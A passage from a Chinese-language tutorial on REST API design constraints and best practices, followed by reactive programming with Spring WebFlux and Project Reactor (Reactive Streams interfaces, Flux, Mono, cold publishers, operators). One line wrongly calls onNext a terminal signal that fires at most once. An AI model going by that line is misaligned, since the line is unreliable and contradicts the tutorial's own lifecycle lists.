<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;orderId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xyz-123&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shipped&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;total&quot;</span><span class="punctuation">:</span> <span class="number">59.99</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/orders/xyz-123&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;customer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/customers/567&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tracking&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tracking/xyz-123&quot;</span> <span class="punctuation">&#125;</span> <span class="comment">// 提供了查询物流的链接</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>好处</strong>: 极大地降低了客户端和服务器的耦合度。如果服务器的URL结构发生变化，只要<code>_links</code>中的链接是正确的，客户端就可以自适应，无需修改代码。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h5 id="5-分层系统-Layered-System"><a href="#5-分层系统-Layered-System" class="headerlink" title="5. 分层系统 (Layered System)"></a>5. 分层系统 (Layered System)</h5><ul>
<li><strong>约束</strong>: 客户端通常不知道它连接的是最终的服务器，还是中间的某个代理。</li>
<li><strong>解读</strong>: 可以在客户端和服务器之间插入多个中间层，如负载均衡器、API网关、安全代理、缓存服务器等。这些中间层可以提供安全、负载均衡、缓存等功能，而不会影响客户端和服务器之间的通信。</li>
<li><strong>好处</strong>: 增强了系统的可伸缩性和安全性。</li>
</ul>
<hr>
<h5 id="6-按需编码-Code-On-Demand-可选约束"><a href="#6-按需编码-Code-On-Demand-可选约束" class="headerlink" title="6. 按需编码 (Code-On-Demand) - 可选约束"></a>6. 按需编码 (Code-On-Demand) - 可选约束</h5><ul>
<li><strong>约束</strong>: 服务器可以通过向客户端发送可执行代码（如JavaScript）来临时扩展或自定义客户端的功能。</li>
<li><strong>解读</strong>: 这是RESTful约束中唯一一个<strong>可选</strong>的。现代Web应用的单页应用（SPA）就是这个约束的典型例子。</li>
</ul>
<hr>
<h4 id="1-6-2-生产环境中的最佳实践"><a href="#1-6-2-生产环境中的最佳实践" class="headerlink" title="1.6.2 生产环境中的最佳实践"></a>1.6.2 生产环境中的最佳实践</h4><h5 id="1-精心设计URI"><a href="#1-精心设计URI" class="headerlink" title="1. 精心设计URI"></a><strong>1. 精心设计URI</strong></h5><ul>
<li><strong>使用kebab-case（短横线分隔命名法）</strong>: <code>GET /product-catalogs/electronic-devices</code>，而不是<code>productCatalogs</code>。它更易读且符合URL的传统。</li>
<li><strong>避免在URI中暴露数据库主键</strong>: 使用业务上唯一的、不透明的标识符（如UUID）代替自增ID，如 <code>/users/f47ac10b-58cc-4372-a567-0e02b2c3d479</code>。</li>
</ul>
<hr>
<h5 id="2-提供结构化的错误响应"><a href="#2-提供结构化的错误响应" class="headerlink" title="2. 提供结构化的错误响应"></a><strong>2. 提供结构化的错误响应</strong></h5><p>当API出错时，不要只返回一个简单的字符串。提供一个结构化的JSON错误对象。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="string">&quot;User not found&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;USER_NOT_FOUND&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The user with ID &#x27;123&#x27; does not exist.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;documentationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://api.example.com/docs/errors#USER_NOT_FOUND&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-强制使用HTTPS"><a href="#3-强制使用HTTPS" class="headerlink" title="3. 强制使用HTTPS"></a><strong>3. 强制使用HTTPS</strong></h5><p>所有API通信都应该使用HTTPS来加密，以防止中间人攻击和数据窃听。</p>
<hr>
<h5 id="4-明确API契约-API-Contract"><a href="#4-明确API契约-API-Contract" class="headerlink" title="4. 明确API契约 (API Contract)"></a><strong>4. 明确API契约 (API Contract)</strong></h5><p>使用 <strong>OpenAPI (Swagger)</strong> 或 <strong>API Blueprint</strong> 等工具来定义和文档化你的API。这会生成一份清晰的API契约，便于前端、后端和测试团队之间的协作，并可以自动生成客户端代码和API文档。</p>
<hr>
<h2 id="2-Spring-WebFlux-异步非阻塞模型"><a href="#2-Spring-WebFlux-异步非阻塞模型" class="headerlink" title="2. Spring WebFlux (异步非阻塞模型)"></a>2. Spring WebFlux (异步非阻塞模型)</h2><h3 id="2-1-什么是响应式编程？-Reactive-Streams规范"><a href="#2-1-什么是响应式编程？-Reactive-Streams规范" class="headerlink" title="2.1 什么是响应式编程？(Reactive Streams规范)"></a>2.1 什么是响应式编程？(Reactive Streams规范)</h3><h4 id="2-1-1-从一个“拉”与“推”的比喻开始"><a href="#2-1-1-从一个“拉”与“推”的比喻开始" class="headerlink" title="2.1.1 从一个“拉”与“推”的比喻开始"></a>2.1.1 从一个“拉”与“推”的比喻开始</h4><p>想象一下你去一家餐厅吃饭的两种不同模式：</p>
<ul>
<li><p><strong>模式一：传统同步阻塞 (拉模式 - Pull Model)</strong></p>
<ol>
<li>你（<strong>消费者线程</strong>）向服务员（<strong>数据源&#x2F;生产者</strong>）点了一份菜（<strong>请求数据</strong>）。</li>
<li>你<strong>坐在原地死等</strong>，什么也不干，直到服务员把菜端上来。这个等待的过程就是<strong>阻塞 (Blocking)</strong>。</li>
<li>如果服务员很忙，或者厨房出菜很慢，你就得一直等下去。你的时间（线程资源）被白白浪费了。</li>
<li>菜来了，你吃了，然后再点下一份，继续死等…</li>
</ol>
<ul>
<li><strong>特点</strong>:<ul>
<li><strong>主动拉取</strong>: 你主动向服务员要菜。</li>
<li><strong>同步</strong>: 你必须等一份菜来了才能点下一份。</li>
<li><strong>阻塞</strong>: 在等待时，你被“卡住”了，无法做其他事。</li>
<li><strong>资源浪费</strong>: 你的时间（线程）在等待中被占用。</li>
</ul>
</li>
<li><strong>这就是传统的同步阻塞编程模型，比如 <code>InputStream.read()</code> 或 <code>RestTemplate</code>。</strong></li>
</ul>
</li>
<li><p><strong>模式二：响应式异步非阻塞 (推模式 - Push Model)</strong></p>
<ol>
<li>你（<strong>消费者&#x2F;订阅者</strong>）告诉服务员（<strong>数据源&#x2F;发布者</strong>）：“这是我的菜单，请按照顺序，做好了就<strong>一道一道给我送过来</strong>。在我等菜的时候，<strong>我会去看书</strong>（做其他事）。”</li>
<li>你和服务员之间建立了一个**“订阅”**关系。</li>
<li>厨房（<strong>数据生产者</strong>）每做好一道菜，服务员就<strong>主动把菜推给你</strong>（<strong>数据推送</strong>）。</li>
<li>当菜送到你面前时，你会<strong>收到一个通知</strong>（<strong>事件回调</strong>），你放下书，吃了这道菜，然后继续看书。你<strong>没有被“卡住”</strong>。</li>
<li>你甚至可以告诉服务员：“我有点饱了，<strong>先别上那么快</strong>”（<strong>背压&#x2F;回压 - Backpressure</strong>）。</li>
</ol>
<ul>
<li><strong>特点</strong>:<ul>
<li><strong>被动接收</strong>: 你不主动要，而是等待服务员主动送。</li>
<li><strong>异步</strong>: 你点完菜就可以做别的事，菜来了再处理。</li>
<li><strong>非阻塞</strong>: 你的时间（线程）没有被等待卡住。</li>
<li><strong>事件驱动</strong>: “菜来了”就是一个事件，触发你“吃”这个动作。</li>
<li><strong>流量控制</strong>: 你可以控制上菜的速度。</li>
</ul>
</li>
<li><strong>这就是响应式编程的核心思想。</strong></li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-2-响应式编程的正式定义"><a href="#2-1-2-响应式编程的正式定义" class="headerlink" title="2.1.2 响应式编程的正式定义"></a>2.1.2 响应式编程的正式定义</h4><p><strong>响应式编程 (Reactive Programming)</strong> 是一种<strong>面向数据流 (Data Streams) 和变化传播 (Propagation of Change)</strong> 的<strong>异步编程范式</strong>。</p>
<p>让我们拆解这个定义：</p>
<ul>
<li><strong>异步编程范式</strong>: 意味着操作不会立即返回结果，而是在未来某个时间点通过回调、事件等方式通知你结果。</li>
<li><strong>面向数据流 (Data Streams)</strong>:<ul>
<li>在响应式编程中，<strong>任何东西都可以被看作是一个数据流</strong>。</li>
<li>一个数据流是一个<strong>按时间排序的事件序列</strong>。这些事件可以是：<ol>
<li><strong>值 (Value)</strong>: 数据项，比如一次数据库查询的结果行、一次HTTP请求的字节块、一次鼠标点击。</li>
<li><strong>错误 (Error)</strong>: 一个表示流中发生错误的信号。</li>
<li><strong>完成 (Completion)</strong>: 一个表示流已经结束的信号。</li>
</ol>
</li>
<li>这个流可以是<strong>有限的</strong>（比如读取文件内容），也可以是<strong>无限的</strong>（比如鼠标点击事件流）。</li>
</ul>
</li>
<li><strong>变化传播 (Propagation of Change)</strong>:<ul>
<li>这是响应式编程的“响应”二字的由来。</li>
<li>你不对数据流本身进行操作，而是定义一套**“处理规则”<strong>（一系列操作符，如<code>map</code>, <code>filter</code>等），然后将这些规则</strong>“附加”**到数据流上。</li>
<li>当数据流中出现新的数据时，这个变化会自动地、<strong>像涟漪一样</strong>穿过你定义的整个处理链，最终产生结果。你只需要**“响应”**这些变化即可。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<p>假设有一个代表用户输入的数据流 <code>inputStream</code>：</p>
<ul>
<li><p><strong>传统命令式编程</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我要主动地、一步一步地去操作</span></span><br><span class="line"><span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!line.isEmpty()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">transformed</span> <span class="operator">=</span> line.toUpperCase();</span><br><span class="line">        System.out.println(transformed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>响应式声明式编程</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我只声明处理规则，数据来了会自动按规则流动</span></span><br><span class="line">inputStream</span><br><span class="line">    .filter(line -&gt; !line.isEmpty()) <span class="comment">// 规则1：过滤掉空行</span></span><br><span class="line">    .map(String::toUpperCase)        <span class="comment">// 规则2：转换为大写</span></span><br><span class="line">    .subscribe(System.out::println); <span class="comment">// 规则3：最终处理方式是打印出来</span></span><br></pre></td></tr></table></figure>

<p>在这个响应式例子中，我们定义了一个处理管道。只有当<code>subscribe</code>被调用时，数据才开始流动。每当<code>inputStream</code>产生一个新数据，它就会自动流经<code>filter</code>和<code>map</code>，最后到达<code>subscribe</code>。</p>
</li>
</ul>
<hr>
<h4 id="2-1-3-Reactive-Streams-规范"><a href="#2-1-3-Reactive-Streams-规范" class="headerlink" title="2.1.3 Reactive Streams 规范"></a>2.1.3 Reactive Streams 规范</h4><p>由于不同的公司和开源社区（如Netflix, Pivotal, Lightbend）都开发了自己的响应式库（RxJava, Project Reactor, Akka Streams），为了确保这些库之间可以<strong>互操作</strong>，他们共同制定了一套标准——<strong>Reactive Streams 规范</strong>。</p>
<p><strong>这套规范非常小，只定义了四个核心接口</strong>:</p>
<ol>
<li><strong><code>Publisher&lt;T&gt;</code> (发布者)</strong><ul>
<li>角色: <strong>数据生产者</strong>。</li>
<li>它只有一个方法: <code>subscribe(Subscriber&lt;? super T&gt; s)</code>。</li>
<li>作用: 允许一个 <code>Subscriber</code> 来“订阅”它。</li>
</ul>
</li>
<li><strong><code>Subscriber&lt;T&gt;</code> (订阅者)</strong><ul>
<li>角色: <strong>数据消费者</strong>。</li>
<li>它有四个方法，定义了它如何**“响应”**来自 <code>Publisher</code> 的事件：<ul>
<li><code>onSubscribe(Subscription s)</code>: 订阅成功时被调用，<code>Publisher</code> 会传递一个 <code>Subscription</code> 对象。</li>
<li><code>onNext(T t)</code>: 接收到一个新的数据项时被调用。</li>
<li><code>onError(Throwable t)</code>: 发生错误时被调用。</li>
<li><code>onComplete()</code>: 数据流正常结束时被调用。</li>
</ul>
</li>
<li><code>onNext</code>, <code>onError</code>, <code>onComplete</code> 都是<strong>终止信号</strong>，一个流最多只会触发其中一个。</li>
</ul>
</li>
<li><strong><code>Subscription</code> (订阅关系)</strong><ul>
<li>角色: <strong>连接 <code>Publisher</code> 和 <code>Subscriber</code> 的桥梁</strong>。</li>
<li>它代表了一个<strong>唯一的</strong>订阅关系。</li>
<li>它有两个方法:<ul>
<li><code>request(long n)</code>: <strong>这是实现背压 (Backpressure) 的核心</strong>。<code>Subscriber</code> 通过调用这个方法来告诉 <code>Publisher</code>：“我准备好了，请再给我 <code>n</code> 个数据”。</li>
<li><code>cancel()</code>: <code>Subscriber</code> 用来取消订阅。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>Processor&lt;T, R&gt;</code> (处理器)</strong><ul>
<li>角色: <strong>处理阶段</strong>，它既是 <code>Subscriber</code> 又是 <code>Publisher</code>。</li>
<li>它订阅上游的 <code>Publisher</code>，对数据进行处理，然后再将处理后的结果发布给下游的 <code>Subscriber</code>。<code>map</code>, <code>filter</code> 等操作符在内部就是通过 <code>Processor</code> 实现的。</li>
</ul>
</li>
</ol>
<p><strong>规范的核心原则</strong>:</p>
<ul>
<li><strong>异步非阻塞</strong>: 所有操作都是异步的。</li>
<li><strong>背压 (Backpressure)</strong>: <strong>数据流的速度由 <code>Subscriber</code> (消费者) 来控制，而不是 <code>Publisher</code> (生产者)</strong>。<code>Publisher</code> 只有在 <code>Subscriber</code> 通过 <code>subscription.request(n)</code> 请求数据时，才能推送最多 <code>n</code> 个数据。这可以有效防止因消费者处理速度慢于生产者而导致的内存溢出（<code>OutOfMemoryError</code>）。</li>
</ul>
<hr>
<h3 id="2-2-核心API-Project-Reactor"><a href="#2-2-核心API-Project-Reactor" class="headerlink" title="2.2 核心API(Project Reactor)"></a>2.2 核心API(Project Reactor)</h3><p>Project Reactor 是 Pivotal（Spring 的母公司）开发的一个实现了 Reactive Streams 规范的、功能强大的响应式编程库。它提供了两种核心的、专门用于处理异步数据流的 <code>Publisher</code> 实现：<strong><code>Mono</code></strong> 和 <strong><code>Flux</code></strong>。</p>
<p>你可以把 <code>Mono</code> 和 <code>Flux</code> 理解为 Java 8 <code>Stream</code> API 的<strong>异步、响应式</strong>版本。它们都提供了一套极其丰富的<strong>操作符 (Operators)</strong>，用于以<strong>声明式</strong>的方式来处理数据流。</p>
<hr>
<h4 id="2-2-1-Flux-处理-0-到-N-个元素"><a href="#2-2-1-Flux-处理-0-到-N-个元素" class="headerlink" title="2.2.1 Flux&lt;T&gt; - 处理 0 到 N 个元素"></a>2.2.1 <code>Flux&lt;T&gt;</code> - 处理 0 到 N 个元素</h4><ul>
<li><p><strong>定义</strong>: <code>Flux</code> 是一个可以发出 <strong>0 到 N 个</strong>元素的异步序列（数据流）的 <code>Publisher</code>。</p>
</li>
<li><p><strong>适用场景</strong>:</p>
<ul>
<li>处理一个<strong>集合</strong>或<strong>数组</strong>中的所有元素。</li>
<li>从数据库查询返回的<strong>多行结果</strong>。</li>
<li>一个持续不断的<strong>事件流</strong>（如消息队列的消息、服务器推送事件SSE）。</li>
<li>HTTP响应中分块（chunked）传输的数据体。</li>
</ul>
</li>
<li><p><strong>生命周期事件</strong>: 一个 <code>Flux</code> 流会按顺序发出：</p>
<ol>
<li><code>onSubscribe</code> (一次)</li>
<li><code>onNext</code> (<strong>0次或多次</strong>)</li>
<li><code>onComplete</code> (最多一次) <strong>或</strong> <code>onError</code> (最多一次)</li>
</ol>
</li>
<li><p><strong>创建 <code>Flux</code> (静态工厂方法)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 从固定元素创建</span></span><br><span class="line">Flux&lt;String&gt; flux1 = Flux.just(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 从集合或数组创建</span></span><br><span class="line">List&lt;String&gt; fruits = Arrays.asList(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>);</span><br><span class="line">Flux&lt;String&gt; flux2 = Flux.fromIterable(fruits);</span><br><span class="line">Flux&lt;String&gt; flux3 = Flux.fromArray(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 从一个范围创建</span></span><br><span class="line">Flux&lt;Integer&gt; flux4 = Flux.range(<span class="number">1</span>, <span class="number">5</span>); <span class="comment">// 发出 1, 2, 3, 4, 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 创建一个空的Flux</span></span><br><span class="line">Flux&lt;Object&gt; emptyFlux = Flux.empty();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 创建一个只发出错误的Flux</span></span><br><span class="line">Flux&lt;Object&gt; errorFlux = Flux.error(<span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Something went wrong&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 创建一个定时发出的Flux (每100ms发出一个从0开始递增的long值)</span></span><br><span class="line">Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofMillis(<span class="number">100</span>)); </span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-2-2-Mono-处理-0-或-1-个元素"><a href="#2-2-2-Mono-处理-0-或-1-个元素" class="headerlink" title="2.2.2 Mono&lt;T&gt; - 处理 0 或 1 个元素"></a>2.2.2 <code>Mono&lt;T&gt;</code> - 处理 0 或 1 个元素</h4><ul>
<li><p><strong>定义</strong>: <code>Mono</code> 是一个最多只能发出 <strong>0 个或 1 个</strong>元素的异步序列的 <code>Publisher</code>。</p>
</li>
<li><p><strong>适用场景</strong>:</p>
<ul>
<li>当你确定一个异步操作<strong>最多只会返回一个结果</strong>时。</li>
<li>一个只返回单个实体的API调用（如 <code>findById</code>）。</li>
<li>一个异步计算的最终结果（如 <code>CompletableFuture</code>）。</li>
<li>一个表示**“完成”但没有具体值**的操作（<code>Mono&lt;Void&gt;</code>），例如保存或删除操作。</li>
</ul>
</li>
<li><p><strong>生命周期事件</strong>: 一个 <code>Mono</code> 流会按顺序发出：</p>
<ol>
<li><code>onSubscribe</code> (一次)</li>
<li><code>onNext</code> (<strong>0次或1次</strong>)</li>
<li><code>onComplete</code> (最多一次) <strong>或</strong> <code>onError</code> (最多一次)</li>
</ol>
</li>
<li><p><strong>创建 <code>Mono</code> (静态工厂方法)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 从一个可能为null的元素创建</span></span><br><span class="line">Mono&lt;String&gt; mono1 = Mono.just(<span class="string">&quot;Apple&quot;</span>);</span><br><span class="line">Mono&lt;String&gt; emptyMonoFromNull = Mono.justOrEmpty(<span class="literal">null</span>); <span class="comment">// 返回一个空的Mono</span></span><br><span class="line">Mono&lt;String&gt; monoFromOptional = Mono.justOrEmpty(Optional.of(<span class="string">&quot;Apple&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个空的Mono (只发出 onComplete 信号)</span></span><br><span class="line">Mono&lt;Void&gt; emptyMono = Mono.empty();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建一个只发出错误的Mono</span></span><br><span class="line">Mono&lt;Object&gt; errorMono = Mono.error(<span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Something went wrong&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 从 Supplier 创建 (延迟执行)</span></span><br><span class="line">Mono&lt;String&gt; supplierMono = Mono.fromSupplier(() -&gt; <span class="string">&quot;Hello from Supplier&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 从 Callable 或 CompletableFuture 创建</span></span><br><span class="line">Mono&lt;String&gt; futureMono = Mono.fromFuture(CompletableFuture.supplyAsync(() -&gt; <span class="string">&quot;Hello from Future&quot;</span>));</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-2-3-核心概念：订阅-Subscription-与惰性求值"><a href="#2-2-3-核心概念：订阅-Subscription-与惰性求值" class="headerlink" title="2.2.3 核心概念：订阅 (Subscription) 与惰性求值"></a>2.2.3 核心概念：订阅 (Subscription) 与惰性求值</h4><p><strong>“冷”发布者 (Cold Publisher)</strong>:</p>
<ul>
<li><code>Flux</code> 和 <code>Mono</code> 默认都是**“冷”的**。这意味着，在你<strong>没有调用 <code>subscribe()</code></strong> 方法之前，<strong>什么都不会发生</strong>。</li>
<li>你通过各种操作符（<code>map</code>, <code>filter</code>等）构建起来的，只是一个<strong>执行计划</strong>或**“数据处理流水线”**的蓝图。</li>
<li>只有当最终的 <code>subscribe()</code> 被调用时，数据才真正开始从源头（<code>Publisher</code>）流动，并穿过整个处理链。</li>
<li>每次有新的订阅者 <code>subscribe()</code>，都会从头开始一个新的数据流。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Flux&lt;String&gt; pipeline = Flux.just(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>)</span><br><span class="line">        .map(String::toUpperCase)</span><br><span class="line">        .log(); <span class="comment">// log()是一个有副作用的操作符，用于观察事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pipeline.subscribe(); // 如果没有这一行，控制台什么都不会打印！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当调用subscribe时，数据才开始流动</span></span><br><span class="line">pipeline.subscribe(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | onSubscribe([Synchronous Fuseable] FluxArray.ArraySubscription)</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | request(unbounded)</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | onNext(A)</span></span><br><span class="line"><span class="comment">// A</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | onNext(B)</span></span><br><span class="line"><span class="comment">// B</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | onNext(C)</span></span><br><span class="line"><span class="comment">// C</span></span><br><span class="line"><span class="comment">// [ INFO] (main) | onComplete()</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-2-4-常用操作符-Operators"><a href="#2-2-4-常用操作符-Operators" class="headerlink" title="2.2.4 常用操作符 (Operators)"></a>2.2.4 常用操作符 (Operators)</h4><p>Reactor 提供了极其丰富的操作符，用于以声明式的方式组合和处理数据流。下面是一些最常用的操作符类别：</p>
<h5 id="1-转换-Transforming"><a href="#1-转换-Transforming" class="headerlink" title="1. 转换 (Transforming)"></a>1. 转换 (Transforming)</h5><ul>
<li><p><strong><code>map(Function&lt;T, R&gt;)</code></strong>: <strong>1对1同步转换</strong>。将流中的每个元素 T 转换为另一个元素 R。类似于 <code>Stream.map</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flux.just(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>).map(i -&gt; i * <span class="number">10</span>).subscribe(System.out::println); <span class="comment">// 输出 10, 20, 30</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>flatMap(Function&lt;T, Publisher&lt;R&gt;&gt;)</code></strong>: <strong>1对多异步转换</strong>。将每个元素 T 转换为一个新的流 <code>Publisher&lt;R&gt;</code>，然后将所有这些新流<strong>合并 (flatten)</strong> 成一个单一的流。这是<strong>处理异步调用的核心</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 findOrdersByUser(user) 是一个返回 Flux&lt;Order&gt; 的异步方法</span></span><br><span class="line">Flux&lt;User&gt; users = Flux.just(user1, user2);</span><br><span class="line">Flux&lt;Order&gt; allOrders = users.flatMap(user -&gt; findOrdersByUser(user));</span><br></pre></td></tr></table></figure>

<p><code>flatMap</code> 不保证顺序，它会交错地发出元素。如果需要保持顺序，使用 <code>concatMap</code>。</p>
</li>
</ul>
<hr>
<h5 id="2-过滤-Filtering"><a href="#2-过滤-Filtering" class="headerlink" title="2. 过滤 (Filtering)"></a>2. 过滤 (Filtering)</h5><ul>
<li><p><strong><code>filter(Predicate&lt;T&gt;)</code></strong>: 根据条件过滤流中的元素。类似于 <code>Stream.filter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flux.range(<span class="number">1</span>, <span class="number">10</span>).filter(i -&gt; i % <span class="number">2</span> == <span class="number">0</span>).subscribe(System.out::println); <span class="comment">// 输出 2, 4, 6, 8, 10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>take(long n)</code></strong>: 只取流中的前 n 个元素。</p>
</li>
<li><p><strong><code>distinct()</code></strong>: 去除重复的元素。</p>
</li>
</ul>
<hr>
<h5 id="3-组合-Combining"><a href="#3-组合-Combining" class="headerlink" title="3. 组合 (Combining)"></a>3. 组合 (Combining)</h5><ul>
<li><p><strong><code>mergeWith(Publisher&lt;T&gt;)</code></strong>: 将两个流合并成一个，元素按它们到达的时间交错发出。</p>
</li>
<li><p><strong><code>zipWith(Publisher&lt;U&gt;, BiFunction&lt;T, U, V&gt;)</code></strong>: 将两个流的元素<strong>按顺序两两配对</strong>，并应用一个函数来组合它们。输出流的长度取决于最短的输入流。</p>
